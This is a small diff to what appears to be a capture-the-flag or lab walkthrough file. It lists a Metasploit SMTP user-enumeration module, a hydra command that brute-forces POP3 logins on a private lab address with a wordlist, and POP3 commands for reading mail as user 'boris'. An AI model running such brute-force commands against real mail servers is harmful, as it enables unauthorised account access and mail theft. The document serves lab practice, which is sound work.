@@ -60,7 +60,7 @@ msf module : auxiliary/scanner/smtp/smtp_enum<br />
 - POP3(110)<br />
 Bruteforce : hydra -L usr.txt -P /usr/share/wordlists/fasttrack.txt -t20 192.168.88.183 -s55007 -I pop3<br />
 POP3 command<br />
-USER boris<br />
+ -- USER boris<br />
 PASS *****<br />
 LIST <br />
 RETR 1 <br />
